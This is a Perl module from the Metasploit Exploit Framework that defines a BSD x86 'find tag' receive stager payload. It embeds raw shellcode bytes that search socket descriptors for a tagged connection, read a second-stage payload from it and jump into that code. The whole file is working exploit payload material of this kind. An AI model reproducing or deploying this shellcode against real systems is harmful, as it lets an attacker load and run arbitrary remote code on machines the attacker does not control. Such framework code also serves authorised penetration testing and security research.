###############
##
#
#    Name: BindStager.pm
# Version: $Revision$
#  Source: src/shellcode/bsd/ia32/stager_sock_find.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 find tag recieve stager for BSD.
#
##
###############

package Msf::PayloadComponent::BSD::ia32::FindRecvStager;

use strict;
use base 'Msf::PayloadComponent::BSD::FindRecvStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'bsd' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					FINDTAG => [ 0x1b, 'RAW' ]
				},
			Payload =>
				"\x31\xd2\x52\x89\xe6\x52\x52\xb2\x80\x52\xb6\x0c\x52\x56\x52\x52" .
				"\x66\xff\x46\xe8\x6a\x1d\x58\xcd\x80\x81\x3e\x6d\x73\x66\x21\x75" .
				"\xef\xfc\xad\x5a\x5f\x5a\xff\xe6"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
